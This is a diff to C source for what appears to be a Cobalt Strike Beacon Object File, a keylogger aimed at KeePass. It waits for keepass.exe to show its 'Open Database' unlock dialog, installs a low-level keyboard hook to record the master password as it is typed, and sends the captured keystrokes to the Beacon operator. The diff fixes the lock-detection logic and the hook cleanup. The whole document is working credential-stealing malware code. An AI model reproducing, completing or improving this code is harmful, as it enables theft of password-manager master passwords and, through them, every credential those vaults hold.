@@ -5,10 +5,10 @@
 
 /*
     Process
-*/ 
+*/
 BOOL ProcessExists(LPCWSTR szProcessName, DWORD* dwPid) {
     PROCESSENTRY32W procEntry = { .dwSize = sizeof(PROCESSENTRY32W) };
-    *dwPid = 0; 
+    *dwPid = 0;
 
     HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
@@ -27,8 +27,7 @@ BOOL ProcessExists(LPCWSTR szProcessName, DWORD* dwPid) {
         DWORD len = MSVCRT$wcslen(procEntry.szExeFile);
         for (DWORD i = 0; i < len && i < MAX_PATH - 1; i++)
             lower[i] = (WCHAR)MSVCRT$towlower(procEntry.szExeFile[i]);
-        
-        // Process name comparison 
+
         if (MSVCRT$wcscmp(lower, szProcessName) == 0) {
             *dwPid = procEntry.th32ProcessID;
             break;
@@ -39,15 +38,14 @@ BOOL ProcessExists(LPCWSTR szProcessName, DWORD* dwPid) {
     return (*dwPid != 0);
 }
 
-/* 
+/*
     Window
-*/ 
+*/
 BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
     ENUM_PARAM* param = (ENUM_PARAM*)lParam;
     DWORD dwPid = 0;
     USER32$GetWindowThreadProcessId(hWnd, &dwPid);
     if (dwPid == param->dwPid) {
-        // Retrieve first visible Window with title
         char title[256] = { 0 };
         USER32$GetWindowTextA(hWnd, title, sizeof(title));
         if (USER32$IsWindowVisible(hWnd) && title[0] != '\0') {
@@ -59,23 +57,24 @@ BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
     return TRUE;
 }
 
-BOOL contains(char* str, char* str2){
-    return (MSVCRT$strstr(str, str2) != NULL); 
+BOOL contains(char* str, char* str2) {
+    return (MSVCRT$strstr(str, str2) != NULL);
 }
 
-BOOL IsUnlocked(DWORD dwPid){
-    // Retrieve handle to KeePass window
-    ENUM_PARAM param = { .dwPid = dwPid, .hWnd = NULL }; 
-    USER32$EnumWindows(EnumWindowsProc, (LPARAM)(&param));     
+// Returns TRUE only when the "Open Database" dialog is actively visible.
+// The old IsUnlocked returned FALSE for "no window", which was misread as
+// "locked" and caused the outer loop to exit during KeePass startup.
+BOOL IsLocked(DWORD dwPid) {
+    ENUM_PARAM param = { .dwPid = dwPid, .hWnd = NULL };
+    USER32$EnumWindows(EnumWindowsProc, (LPARAM)(&param));
     if (!param.hWnd)
-        return FALSE; 
-    return !contains(param.title, "Open Database");  
+        return FALSE;
+    return contains(param.title, "Open Database");
 }
 
 /*
     Keylogger
-
-*/ 
+*/
 static char gBuffer[KEY_BUFFER_SIZE] = { 0 };
 static int gPos = 0;
 static HHOOK hHook = NULL;
@@ -92,7 +91,7 @@ VOID FlushBuffer(VOID) {
     if (gPos > 0) {
         gBuffer[gPos] = '\0';
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured keystrokes:\n\n%s\n\n", gBuffer);
-        BeaconWakeup(); 
+        BeaconWakeup();
         MSVCRT$memset(gBuffer, 0, KEY_BUFFER_SIZE);
         gPos = 0;
     }
@@ -100,7 +99,7 @@ VOID FlushBuffer(VOID) {
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-        
+
         KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
 
         // Only log keystrokes when the "Open Database" window is focused
@@ -116,7 +115,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         BYTE keyState[256] = { 0 };
         if (USER32$GetAsyncKeyState(VK_SHIFT) & 0x8000) 
-            keyState[VK_SHIFT] = 0x80;
+            keyState[VK_SHIFT]   = 0x80;
         if (USER32$GetAsyncKeyState(VK_LSHIFT) & 0x8000) 
             keyState[VK_LSHIFT]  = 0x80;
         if (USER32$GetAsyncKeyState(VK_RSHIFT) & 0x8000) 
@@ -137,7 +136,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         }
 
         switch (kb->vkCode) {
-            case VK_RETURN: 
+            case VK_RETURN:   
                 LogKey("[ENTER]\n"); break;
             case VK_BACK:     
                 LogKey("[BACK]"); break;
@@ -148,14 +147,13 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             case VK_ESCAPE:   
                 LogKey("[ESC]"); break;
             case VK_SPACE:    
-                LogKey(" "); break; 
+                LogKey(" "); break;
             case VK_LSHIFT:
             case VK_RSHIFT:
             case VK_LCONTROL:
             case VK_RCONTROL:
             case VK_LMENU:
-            case VK_RMENU: 
-                break;
+            case VK_RMENU: break;
             default: break;
         }
     }
@@ -164,33 +162,36 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 /*
     Entry point
-*/ 
-VOID go(char* args, int argc){
+*/
+VOID go(char* args, int argc) {
 
-    datap parser; 
-    HANDLE hStop = BeaconGetStopJobEvent(); 
+    datap parser;
+    HANDLE hStop = BeaconGetStopJobEvent();
+    BeaconDataParse(&parser, args, argc);
 
-    BeaconDataParse(&parser, args, argc); 
-    int interval = BeaconDataInt(&parser); 
-    
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for KeePass process creation events.\n"); 
-    BeaconWakeup(); 
+    gPos = 0;
+    hHook = NULL;
+    MSVCRT$memset(gBuffer, 0, KEY_BUFFER_SIZE);
 
-    DWORD dwPid = 0; 
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for KeePass...\n");
+    BeaconWakeup();
+
+    DWORD dwPid = 0;
     WCHAR szKeePass[] = { 'k','e','e','p','a','s','s','.','e','x','e', '\0' };
 
-_MONITOR: 
+_MONITOR:
 
-    while (!ProcessExists(szKeePass, &dwPid) || IsUnlocked(dwPid)) {
-        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
+    // Wait until a locked KeePass instance is found
+    while (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid)) {
+        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, 500, FALSE);
         if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
             goto _CLEANUP;
     }
-    
-    // Notify process creation
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] KeePass detected: %lu.\n", dwPid); 
-    
-    // Register keylogger
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Locked KeePass database detected (PID: %lu).\n", dwPid);
+    BeaconWakeup();
+
+    // Install keyboard hook
     hHook = USER32$SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (!hHook) {
         BeaconPrintf(CALLBACK_OUTPUT, "[-] SetWindowsHookExA failed: %lu\n", KERNEL32$GetLastError());
@@ -200,31 +201,34 @@ _MONITOR:
     DWORD lastCheck = KERNEL32$GetTickCount();
     while (TRUE) {
         DWORD wait = USER32$MsgWaitForMultipleObjects(1, &hStop, FALSE, 50, QS_ALLINPUT);
-        
         if (wait == WAIT_OBJECT_0)
-        goto _CLEANUP;
-        
+            goto _CLEANUP;
+
         MSG msg;
         while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE))
-        USER32$DispatchMessageA(&msg);
-        
+            USER32$DispatchMessageA(&msg);
+
         DWORD now = KERNEL32$GetTickCount();
-        if (now - lastCheck >= (DWORD)(interval * 1000)) {
+        if (now - lastCheck >= 200) {
             lastCheck = now;
-            if (!ProcessExists(szKeePass, &dwPid) || IsUnlocked(dwPid))
-            break;
+            if (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid))
+                break;
         }
     }
-    
-    // Unregister keylogger
+
     USER32$UnhookWindowsHookEx(hHook);
     hHook = NULL;
 
-    FlushBuffer(); 
-    goto _MONITOR; 
+    FlushBuffer();
+    goto _MONITOR;
 
-_CLEANUP: 
-    
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n"); 
-    return; 
+_CLEANUP:
+
+    // Uninstall keyboard hook
+    if (hHook) {
+        USER32$UnhookWindowsHookEx(hHook);
+        hHook = NULL;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
+    return;
 }
